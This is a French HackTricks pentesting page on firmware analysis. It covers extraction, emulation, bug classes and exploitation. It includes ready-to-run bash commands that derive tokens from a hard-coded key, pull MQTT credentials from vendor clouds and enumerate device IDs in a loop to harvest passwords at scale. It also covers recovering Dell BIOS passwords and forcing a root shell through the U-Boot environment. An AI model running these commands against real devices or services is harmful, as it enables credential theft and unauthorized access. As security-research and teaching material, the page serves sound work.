# Analyse du firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introduction**

### Ressources associées

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Le firmware est un logiciel essentiel qui permet aux appareils de fonctionner correctement en gérant et en facilitant la communication entre les composants matériels et les logiciels utilisés par les utilisateurs. Il est stocké dans une mémoire permanente, ce qui garantit que l’appareil peut accéder aux instructions indispensables dès sa mise sous tension et lancer ainsi le système d’exploitation. L’examen du firmware et sa modification éventuelle constituent une étape cruciale pour identifier les vulnérabilités de sécurité.<sup>[[2]](#references)[[3]](#references)</sup>

## **Collecte d’informations**

La **collecte d’informations** est une première étape essentielle pour comprendre la composition d’un appareil et les technologies qu’il utilise. Elle consiste à recueillir des données sur :

- L’architecture du CPU et le système d’exploitation utilisé
- Les spécificités du bootloader
- La disposition matérielle et les fiches techniques
- Les métriques du code et les emplacements du code source
- Les bibliothèques externes et les types de licences
- L’historique des mises à jour et les certifications réglementaires
- Les diagrammes d’architecture et de flux
- Les évaluations de sécurité et les vulnérabilités identifiées

À cette fin, les outils d’**open-source intelligence (OSINT)** sont précieux, tout comme l’analyse manuelle et automatisée des composants logiciels open source disponibles. Des outils comme [Coverity Scan](https://scan.coverity.com) et [LGTM de Semmle](https://lgtm.com/#explore) proposent une analyse statique gratuite qui peut aider à détecter d’éventuels problèmes.

## **Obtention du firmware**

Il existe plusieurs façons d’obtenir le firmware, chacune présentant un niveau de complexité différent :

- L’obtenir **directement** auprès de la source (développeurs, fabricants)
- Le **compiler** en suivant les instructions fournies
- Le **télécharger** depuis les sites d’assistance officiels
- Utiliser des requêtes **Google dork** pour trouver des fichiers de firmware hébergés
- Accéder directement au **cloud storage**, à l’aide d’outils comme [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intercepter les **mises à jour** au moyen de techniques man-in-the-middle
- L’**extraire** de l’appareil via des connexions comme **UART**, **JTAG** ou **PICit**
- **Sniffer** les requêtes de mise à jour dans les communications de l’appareil
- Identifier et utiliser les **endpoints de mise à jour codés en dur**
- **Réaliser un dump** depuis le bootloader ou le réseau
- **Retirer et lire** la puce de stockage, en dernier recours, à l’aide du matériel approprié

### Journaux UART uniquement : forcer un shell root via l’environnement U-Boot en flash

Si le RX UART est ignoré (journaux uniquement), vous pouvez tout de même forcer un shell init en **modifiant hors ligne le blob d’environnement U-Boot** :<sup>[[6]](#references)</sup>

1. Faire un dump de la mémoire flash SPI avec une pince SOIC-8 et un programmateur (3,3 V) :
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Localisez la partition env de U-Boot, modifiez `bootargs` pour y inclure `init=/bin/sh`, puis **recalculez le CRC32 de l’env U-Boot** pour le blob.
3. Reflashez uniquement la partition env et redémarrez ; un shell devrait apparaître sur l’UART.

Cette méthode est utile sur les appareils embarqués dont le shell du bootloader est désactivé, mais dont la partition env est accessible en écriture via un accès externe à la flash.

## Analyse du firmware

Maintenant que vous **disposez du firmware**, vous devez en extraire des informations pour savoir comment le traiter. Voici différents outils que vous pouvez utiliser pour cela :

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Si vous ne trouvez pas grand-chose avec ces outils, vérifiez l’**entropie** de l’image avec `binwalk -E <bin>` ; si elle est faible, l’image n’est probablement pas chiffrée. Si elle est élevée, elle est probablement chiffrée (ou compressée d’une manière ou d’une autre).

Vous pouvez également utiliser ces outils pour extraire les **fichiers intégrés au firmware** :

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) pour inspecter le fichier.

### Analyse différentielle de la flash et stockage récupérable de secrets XOR

Lorsqu’un paramètre du firmware n’a pas de format de stockage documenté, effectuez d’abord plusieurs lectures identiques de la flash, modifiez **exactement un** paramètre, récupérez à nouveau le contenu complet de la puce, puis comparez les offsets. Répéter l’expérience avec des valeurs contrôlées permet de distinguer le paramètre des compteurs et des métadonnées d’écriture ; des modifications à de nouveaux offsets plutôt qu’en place indiquent un stockage en ajout seulement ou structuré en journal. Conservez les entrées supprimées ou marquées comme supprimées, car leurs octets de données peuvent rester récupérables.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Après avoir localisé la région, extrayez les modules du firmware à l'aide d'outils tels que `binwalk`, puis procédez à la rétro-ingénierie du writer et du validator dans Ghidra. Confirmez dans le code les limites des champs, le padding, l'indexation des clés et la dérivation des clés, au lieu de déduire le schéma uniquement à partir des motifs du texte chiffré.<sup>[[10]](#references)</sup>

#### Récupérer des clés à partir d'un padding de zéros chiffré

Comme expliqué dans [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), un texte en clair connu révèle les octets de keystream aux mêmes offsets. Un champ de taille fixe est particulièrement exposé lorsque son padding de zéros couvre tous les index d'une clé XOR répétée : le padding chiffré révèle directement ces octets de clé, car `0x00 XOR key_byte = key_byte`. Si tous les index de la clé sont couverts, reconstituez la clé à partir de la fin du texte chiffré et déchiffrez les octets renseignés.<sup>[[10]](#references)</sup>

Le format vulnérable de mot de passe BIOS DVAR de Dell en est un exemple concret : l'octet `0` d'un champ de 32 octets est en clair, tandis que les octets `1..31` utilisent une clé répétée de 20 octets.<sup>[[10]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Pour une longueur de mot de passe `L`, les positions `L..31` étaient à zéro avant le XOR. Lorsque `L <= 12`, ces positions couvrent tous les index de clé, ce qui permet de récupérer la clé complète et le mot de passe sans brute force :<sup>[[10]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Extraire des clés à partir d’enregistrements historiques

N’analysez pas chaque enregistrement indépendamment. La clé DVAR est dérivée approximativement ainsi : `modified_md5(device_seed || variable_GUID || password[0])` : le seed de l’appareil et le GUID sont fixes, et la seule entrée dépendant du mot de passe est son premier octet en clair. Cela donne au plus 256 clés par appareil, et les enregistrements commençant par le même octet partagent une clé. Regroupez les enregistrements actifs et supprimés selon cet octet ; un court enregistrement historique peut révéler la clé complète grâce au padding, puis permettre de déchiffrer un enregistrement actuel plus long dont le padding ne suffit pas. La rotation du mot de passe peut donc accroître l’exposition lorsque l’ancien texte chiffré est marqué comme supprimé au lieu d’être effacé.<sup>[[10]](#references)</sup>

L’outil [`dellpwn`](https://github.com/R3n5k1/dellpwn) localise DVAR, valide les enregistrements candidats, récupère les mots de passe et peut afficher les octets bruts stockés/de clé. Compilez-le à partir d’un checkout et analysez une image flash vérifiée comme suit :<sup>[[11]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Pour les parseurs personnalisés, rejetez les faux positifs en vérifiant la structure des enregistrements, les contraintes sur les caractères imprimables, le remplissage par des zéros, l’entropie de la clé et la cohérence lorsque la clé revient au début. Si des dumps répétés montrent de rares changements de bits à chaque écriture, énumérez les masques observés et classez les corrections en fonction de ces contraintes, mais signalez les caractères ambigus au lieu de présenter un résultat heuristique comme une récupération exacte.<sup>[[10]](#references)</sup>

Les vérificateurs de mots de passe doivent stocker un hash unidirectionnel salé et itéré plutôt qu’un texte chiffré réversible, et les stockages à journalisation structurée doivent supprimer de manière sécurisée les données secrètes remplacées.<sup>[[10]](#references)</sup>

### Récupérer le système de fichiers

Avec les outils commentés précédemment, comme `binwalk -ev <bin>`, vous devriez avoir pu **extraire le système de fichiers**.\
Binwalk l’extrait généralement dans un **dossier nommé d’après le type de système de fichiers**, qui est habituellement l’un des suivants : squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extraction manuelle du système de fichiers

Parfois, binwalk **ne reconnaît pas la signature du système de fichiers**. Dans ce cas, utilisez binwalk pour **trouver le décalage du système de fichiers, puis découper le système de fichiers compressé** à partir du binaire et **extraire manuellement** le système de fichiers selon son type, en suivant les étapes ci-dessous.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Exécutez la **commande dd** suivante pour extraire le système de fichiers Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativement, la commande suivante peut également être exécutée.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Pour squashfs (utilisé dans l’exemple ci-dessus)

`$ unsquashfs dir.squashfs`

Les fichiers se trouveront ensuite dans le répertoire "`squashfs-root`".

- Fichiers d’archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Pour les systèmes de fichiers jffs2

`$ jefferson rootfsfile.jffs2`

- Pour les systèmes de fichiers ubifs avec mémoire flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyse du firmware

Une fois le firmware obtenu, il est essentiel de le disséquer afin d’en comprendre la structure et les vulnérabilités potentielles. Ce processus implique l’utilisation de divers outils pour analyser et extraire des données utiles de l’image du firmware.

### Outils d’analyse initiale

Un ensemble de commandes est fourni pour effectuer une première inspection du fichier binaire (désigné par `<bin>`). Ces commandes permettent d’identifier les types de fichiers, d’extraire des chaînes de caractères, d’analyser des données binaires et de comprendre les détails des partitions et du système de fichiers :

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Pour évaluer l’état du chiffrement de l’image, on vérifie l’**entropie** avec `binwalk -E <bin>`. Une faible entropie suggère une absence de chiffrement, tandis qu’une entropie élevée indique un chiffrement ou une compression possible.

Pour extraire les **fichiers intégrés**, il est recommandé d’utiliser des outils et ressources comme la documentation **file-data-carving-recovery-tools** et **binvis.io** pour inspecter les fichiers.

### Extraction du système de fichiers

Avec `binwalk -ev <bin>`, on peut généralement extraire le système de fichiers, souvent dans un répertoire nommé d’après son type (par exemple, squashfs, ubifs). Toutefois, si **binwalk** ne parvient pas à reconnaître le type de système de fichiers en raison de l’absence de magic bytes, une extraction manuelle est nécessaire. Il faut alors utiliser `binwalk` pour localiser le décalage du système de fichiers, puis la commande `dd` pour en extraire les données :

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Ensuite, selon le type de système de fichiers (p. ex., squashfs, cpio, jffs2, ubifs), différentes commandes sont utilisées pour en extraire manuellement le contenu.

### Analyse du système de fichiers

Une fois le système de fichiers extrait, la recherche de failles de sécurité commence. L’attention se porte sur les daemons réseau non sécurisés, les identifiants codés en dur, les points de terminaison API, les fonctionnalités des serveurs de mise à jour, le code non compilé, les scripts de démarrage et les binaires compilés à analyser hors ligne.

Les **emplacements clés** et les **éléments** à examiner comprennent :

- **etc/shadow** et **etc/passwd** pour les identifiants des utilisateurs
- Les certificats et clés SSL dans **etc/ssl**
- Les fichiers de configuration et les scripts susceptibles de contenir des vulnérabilités
- Les binaires embarqués à analyser plus en détail
- Les serveurs web et binaires courants des appareils IoT

Plusieurs outils permettent de découvrir des informations sensibles et des vulnérabilités dans le système de fichiers :

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) et [**Firmwalker**](https://github.com/craigz28/firmwalker) pour rechercher des informations sensibles
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) pour une analyse complète du firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) et [**EMBA**](https://github.com/e-m-b-a/emba) pour l’analyse statique et dynamique

### Vérifications de sécurité des binaires compilés

Le code source et les binaires compilés trouvés dans le système de fichiers doivent être examinés à la recherche de vulnérabilités. Des outils comme **checksec.sh** pour les binaires Unix et **PESecurity** pour les binaires Windows permettent d’identifier les binaires dépourvus de protections et susceptibles d’être exploités.

## Récupération de la configuration cloud et des identifiants MQTT via des jetons d’URL dérivés

De nombreux hubs IoT récupèrent leur configuration propre à chaque appareil depuis un point de terminaison cloud qui ressemble à ceci :<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Lors de l’analyse du firmware, vous pouvez découvrir que `<token>` est dérivé localement de l’identifiant de l’appareil à l’aide d’un secret codé en dur, par exemple :

- token = MD5( deviceId || STATIC_KEY ) et représenté en hexadécimal majuscule

Cette conception permet à quiconque connaissant un deviceId et le STATIC_KEY de reconstruire l’URL et de récupérer la configuration cloud, qui révèle souvent des identifiants MQTT en clair et des préfixes de topics.

Procédure pratique :

1) Extraire le deviceId des logs de démarrage UART

- Connectez un adaptateur UART 3,3 V (TX/RX/GND) et capturez les logs :

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Recherchez les lignes qui affichent le modèle d’URL de configuration cloud et l’adresse du broker, par exemple :

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Récupérer STATIC_KEY et l’algorithme du token à partir du firmware

- Chargez les binaires dans Ghidra/radare2 et recherchez le chemin de configuration ("/pf/") ou l’utilisation de MD5.
- Confirmez l’algorithme (p. ex., MD5(deviceId||STATIC_KEY)).
- Calculez le token dans Bash et mettez le digest en majuscules :

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Récupérer la configuration cloud et les identifiants MQTT

- Composer l’URL et récupérer le JSON avec curl ; utiliser jq pour extraire les secrets :

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Exploiter MQTT en clair et des ACL de topics faibles (si présentes)

- Utilisez les identifiants récupérés pour vous abonner aux topics de maintenance et rechercher des événements sensibles :

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Énumérer les ID d’appareils prévisibles (à grande échelle, avec autorisation)

- De nombreux écosystèmes intègrent des octets OUI/produit/type du fabricant, suivis d’un suffixe séquentiel.
- Vous pouvez parcourir les ID candidats, dériver des tokens et récupérer des configurations par programmation :

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Remarques
- Obtenez toujours une autorisation explicite avant toute tentative d’énumération à grande échelle.
- Privilégiez l’émulation ou l’analyse statique pour récupérer des secrets sans modifier le matériel cible, lorsque c’est possible.

L’émulation du firmware permet une **analyse dynamique** du fonctionnement d’un appareil ou d’un programme donné. Cette approche peut se heurter à des dépendances matérielles ou architecturales. Toutefois, transférer le système de fichiers racine ou des binaires spécifiques vers un appareil doté de la même architecture et du même ordre des octets, comme un Raspberry Pi, ou vers une machine virtuelle préconfigurée, peut faciliter la poursuite des tests.

### Émulation de binaires individuels

Pour examiner un programme isolé, il est essentiel d’identifier son ordre des octets et son architecture CPU.

#### Exemple avec l’architecture MIPS

Pour émuler un binaire destiné à l’architecture MIPS, on peut utiliser la commande :

```bash
file ./squashfs-root/bin/busybox
```

Et pour installer les outils d’émulation nécessaires :

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Pour MIPS (big-endian), `qemu-mips` est utilisé, tandis que `qemu-mipsel` convient aux binaires little-endian.

#### Émulation de l'architecture ARM

Pour les binaires ARM, le processus est similaire : l'émulateur `qemu-arm` est utilisé.

### Émulation complète du système

Des outils comme [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) et d'autres facilitent l'émulation complète du firmware, automatisent le processus et facilitent l'analyse dynamique.

### Reconstruire les systèmes de fichiers racine fractionnés et vérifiés pour l'émulation

Si un superbloc SquashFS est lisible, mais que les offsets des inodes, des répertoires ou de la table des fragments sont impossibles, ne modifiez pas immédiatement `unsquashfs`. Faites de l'ingénierie inverse sur le binaire de démarrage précoce et reproduisez le graphe des périphériques bloc qu'il crée : les systèmes embarqués peuvent exposer une partition racine nominale, mais construire le véritable système de fichiers au moyen d'un mappage `dm-linear` qui ajoute des secteurs empruntés à une autre partition. Les vérifications du seul superbloc peuvent réussir même si tous les blocs de métadonnées suivants sont décalés.<sup>[[9]](#references)</sup>

Reproduisez exactement les opérations arithmétiques du firmware. En particulier, déterminez si les longueurs sont exprimées en octets, en secteurs de 512 octets ou en pages de 4 Kio ; reproduisez les décalages et les troncatures dans leur ordre d'origine ; et tenez compte des régions de fin dépendantes de la banque dans les configurations A/B. Par exemple, `(partition_bytes >> 12) << 3` tronque d'abord à une frontière de 4 Kio, puis exprime le résultat en secteurs de 512 octets ; le remplacer par `partition_bytes // 512` peut décaler l'étendue ajoutée de quelques kilo-octets et corrompre toutes les tables SquashFS en aval.<sup>[[9]](#references)</sup>

Voici un processus de validation utile :<sup>[[9]](#references)</sup>

1. Récupérez le périphérique source, le secteur de départ et la longueur de chaque segment `dm-linear` à partir du binaire verifier/init.
2. Concaténez ou mappez les étendues sans modifier leur sémantique d'alignement.
3. Si l'extraction échoue toujours, effectuez une recherche dans une petite plage autour de la frontière prédite et exigez plusieurs structures de métadonnées valides consécutives, au lieu de vous fier uniquement à un superbloc plausible.
4. Exécutez `unsquashfs` sans modification sur l'image reconstruite ; le parcours réussi de tous les répertoires et fragments constitue une preuve plus solide que `unsquashfs -stat`.

#### Remplacement de dm-verity contrôlé par l'analyste

Lorsque l'analyste contrôle le noyau QEMU, l'initramfs et les disques virtuels, il est possible de démarrer une racine modifiée en remplaçant le PID 1 de vérification du fournisseur par un petit init lié statiquement. Il s'agit d'une **substitution de la chaîne de démarrage en laboratoire**, et non d'une compromission de dm-verity, de sa signature RSA, de Secure Boot ou d'une clé scellée par un TPM.<sup>[[9]](#references)</sup>

L'init de remplacement doit reproduire les étapes opérationnelles du chemin de démarrage d'origine : monter `devtmpfs`, appeler `setsid()`, relier `/dev/console` aux descripteurs de fichier 0–2, monter `/proc` et `/sys`, attendre le périphérique bloc fourni, monter la racine modifiée en lecture seule, détacher les pseudo-systèmes de fichiers de l'ancienne racine, déplacer le nouveau montage sur `/`, exécuter `chroot`, puis appeler `execve()` sur le `/sbin/init` d'origine du firmware. Détacher `/dev`, `/proc` et `/sys` **avant** `MS_MOVE` évite de détacher accidentellement des points de montage appartenant à la nouvelle racine.<sup>[[9]](#references)</sup>

Conservez l'état mutable du périphérique séparément de la racine immuable modifiée. Une superposition qcow2 peut préserver l'état LVM du disque d'origine, tandis qu'un second disque virtio en lecture seule fournit le SquashFS modifié :<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Débogage de l’état de l’image hors ligne

Inspectez l’état persistant en dehors de l’invité lorsque des démarrages lents, des scripts de démarrage destructeurs ou des journaux de console peu fiables masquent la panne. N’attachez jamais un overlay utilisé par une VM en cours d’exécution ; exposez-le avec `qemu-nbd`, limitez la découverte LVM à la partition NBD prévue et désactivez le groupe de volumes avant de le déconnecter.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Pour isoler les pannes de façon reproductible, écrivez des fichiers marqueurs horodatés sur un volume inscriptible stable et vérifiez-les hors ligne ; `/dev/kmsg`, les FIFO et les consoles temporaires peuvent produire des faux négatifs en raison de la limitation du débit ou de l’arrêt prématuré du processus. Comparez également les interfaces exactes entre les couches avant de modifier du code sans rapport : `uname -r` par rapport à `/lib/modules/`, les fonctionnalités ext4 sur disque par rapport à la configuration du kernel, et la génération de `libGL` de Mesa par rapport à l’ABI du pilote DRI et aux noms de pilotes déduits du PCI. Un composant peut exister et même être chargé avec succès via `dlopen()`, tout en restant inutilisable parce que son consommateur attend une ABI différente.<sup>[[9]](#references)</sup>

## Analyse dynamique en pratique

À ce stade, un environnement de périphérique réel ou émulé est utilisé pour l’analyse. Il est essentiel de conserver un accès shell au système d’exploitation et au système de fichiers. L’émulation ne reproduit pas toujours parfaitement les interactions matérielles, ce qui peut nécessiter de redémarrer l’émulation de temps à autre. L’analyse doit réexaminer le système de fichiers, exploiter les pages web et les services réseau exposés, et explorer les vulnérabilités du bootloader. Les tests d’intégrité du firmware sont essentiels pour identifier d’éventuelles vulnérabilités de backdoor.

## Techniques d’analyse à l’exécution

L’analyse à l’exécution consiste à interagir avec un processus ou un binaire dans son environnement d’exploitation, à l’aide d’outils comme gdb-multiarch, Frida et Ghidra pour définir des points d’arrêt et identifier des vulnérabilités au moyen du fuzzing et d’autres techniques.

Pour les cibles embarquées sans débogueur complet, **copiez un `gdbserver` lié statiquement** sur le périphérique et attachez-vous à distance :<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Cartographie des messages Zigbee / coprocesseur radio

Sur les hubs IoT, la pile RF est souvent répartie entre un **MCU radio** et un processus Linux en espace utilisateur. Une méthode utile consiste à cartographier le chemin :<sup>[[8]](#references)</sup>

1. **Trame RF** transmise par radio
2. **Analyseur côté contrôleur** sur le MCU radio
3. **Protocole texte série/UART ou TLV** transmis à Linux (par exemple `/dev/tty*`)
4. **Dispatcher applicatif** dans le daemon principal
5. **Gestionnaire spécifique au protocole / machine à états**

Cette architecture crée deux cibles de reverse engineering au lieu d’une. Si le contrôleur convertit les trames radio binaires en protocole textuel tel que `Group,Command,arg1,arg2,...`, identifiez :

- Les **groupes de messages** et les tables de dispatch
- Les messages qui peuvent provenir du **réseau** plutôt que du contrôleur lui-même
- Les champs discriminateurs exacts **spécifiques au fabricant** (par exemple `manufacturer_code` Zigbee et `cluster_command` personnalisé)
- Les gestionnaires accessibles uniquement pendant les phases de **commissioning**, de découverte ou de téléchargement de firmware/modèle

Pour Zigbee en particulier, capturez le trafic d’appairage et vérifiez si la cible repose toujours sur la **Link Key** par défaut `ZigBeeAlliance09`. Si c’est le cas, l’écoute du trafic de commissioning peut révéler la **Network Key**. Les install codes de Zigbee 3.0 réduisent cette exposition ; vérifiez donc si l’appareil testé les impose réellement.

### Gestionnaires de protocoles spécifiques au fabricant et accessibilité contrôlée par une FSM

Les commandes Zigbee/ZCL spécifiques au fabricant constituent souvent une meilleure cible que les clusters normalisés, car elles alimentent du **code d’analyse personnalisé** et des **FSM** internes dont la validation a été moins éprouvée.<sup>[[8]](#references)</sup>

Méthode pratique :

- Effectuez le reverse engineering du dispatcher de commandes jusqu’à trouver le **gestionnaire réservé au fabricant**.
- Récupérez les tables **d’état de la FSM**, **d’événements**, de **vérifications**, d’**actions** et d’**états suivants**.
- Identifiez les **états transitoires** qui avancent automatiquement, ainsi que les branches de nouvelle tentative/d’erreur qui finissent par réinitialiser ou libérer l’état contrôlé par l’attaquant.
- Vérifiez quels échanges de protocole légitimes sont nécessaires pour placer le daemon dans l’état vulnérable, au lieu de supposer que le gestionnaire bogué est toujours accessible.

Pour les protocoles sensibles au timing, la relecture de paquets depuis un framework Python peut être trop lente. Une approche plus fiable consiste à émuler un appareil légitime sur du matériel réel (par exemple un **nRF52840**) avec une pile de qualité industrielle, afin d’exposer les bons **endpoints**, **attributs** et délais de commissioning.

### Classe de bogues liés aux téléchargements fragmentés dans les daemons embarqués

Une classe de bogues de firmware récurrente apparaît dans les téléchargements fragmentés de blobs/modèles/configurations :<sup>[[8]](#references)</sup>

1. Le **premier fragment** (`offset == 0`) stocke `ctx->total_size` et alloue `malloc(total_size)`.
2. Les fragments suivants valident uniquement les champs **locaux au paquet** contrôlés par l’attaquant, tels que `packet_total_size >= offset + chunk_len`.
3. La copie utilise `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sans vérifier qu’elle reste dans la **taille initialement allouée**.

Un attaquant peut ainsi envoyer :

- Un premier fragment valide avec une taille totale déclarée **petite** pour forcer une petite allocation sur le tas.
- Un fragment ultérieur avec l’**offset attendu**, mais un `chunk_len` plus grand.
- Une taille locale au paquet falsifiée qui satisfait les vérifications récentes tout en débordant le tampon initialement alloué.

Lorsque le chemin vulnérable est protégé par la logique de commissioning, l’exploitation doit inclure suffisamment d’**émulation d’appareil** pour amener la cible dans l’état attendu de téléchargement de modèle ou de blob avant d’envoyer les fragments malformés.

### Déclencheurs de `free()` pilotés par le protocole

Dans les daemons embarqués, le moyen le plus simple de déclencher l’exploitation des métadonnées du tas consiste souvent non pas à « attendre le nettoyage », mais à **forcer le mécanisme de gestion des erreurs du protocole** :<sup>[[8]](#references)</sup>

- Envoyez des fragments de suivi malformés pour faire passer la FSM aux états de **nouvelle tentative** ou d’**erreur**.
- Dépassez le seuil de tentatives pour que le daemon **réinitialise le contexte** et libère le tampon corrompu.
- Utilisez ce `free()` prévisible pour déclencher des primitives côté allocateur avant que le processus ne plante pour d’autres raisons.

Cette méthode est particulièrement utile contre les allocateurs de type **musl/uClibc/dlmalloc** sur Linux embarqué, où la corruption des métadonnées de chunk peut transformer la logique unlink/unbin en primitive d’écriture. Une approche stable consiste à corrompre un **champ de taille** pour rediriger le parcours de l’allocateur vers des **faux chunks placés dans le tampon débordé**, plutôt que d’écraser directement les pointeurs de bins réels et de faire planter le processus.

## Exploitation binaire et preuve de concept

Le développement d’un PoC pour les vulnérabilités identifiées nécessite une compréhension approfondie de l’architecture cible et la maîtrise de langages de programmation de bas niveau. Les protections du runtime binaire sont rares dans les systèmes embarqués, mais lorsqu’elles sont présentes, des techniques comme le Return Oriented Programming (ROP) peuvent être nécessaires.

### Notes sur l’exploitation des fastbins uClibc (Linux embarqué)

- **Fastbins + consolidation :** uClibc utilise des fastbins similaires à ceux de glibc. Une allocation importante ultérieure peut déclencher `__malloc_consolidate()` ; tout faux chunk doit donc satisfaire les vérifications (taille raisonnable, `fd = 0` et chunks voisins considérés comme « utilisés »).<sup>[[6]](#references)</sup>
- **Binaires non-PIE sous ASLR :** si ASLR est activé, mais que le binaire principal est **non-PIE**, les adresses `.data/.bss` du binaire restent stables. Vous pouvez cibler une zone qui ressemble déjà à un en-tête de chunk valide du tas pour faire aboutir une allocation fastbin sur une **table de pointeurs de fonctions**.
- **NUL qui arrête l’analyseur :** lors de l’analyse du JSON, un `\x00` dans la charge utile peut arrêter l’analyse tout en préservant les octets contrôlés par l’attaquant qui suivent, afin de former un pivot de pile/une chaîne ROP.
- **Shellcode via `/proc/self/mem` :** une chaîne ROP qui appelle `open("/proc/self/mem")`, `lseek()` et `write()` peut déposer du shellcode exécutable dans un mapping connu et sauter vers celui-ci.

## Systèmes d’exploitation préparés pour l’analyse de firmware

Des systèmes d’exploitation comme [AttifyOS](https://github.com/adi0x90/attifyos) et [EmbedOS](https://github.com/scriptingxss/EmbedOS) fournissent des environnements préconfigurés pour tester la sécurité des firmwares, équipés des outils nécessaires.

## OS préparés pour analyser le firmware

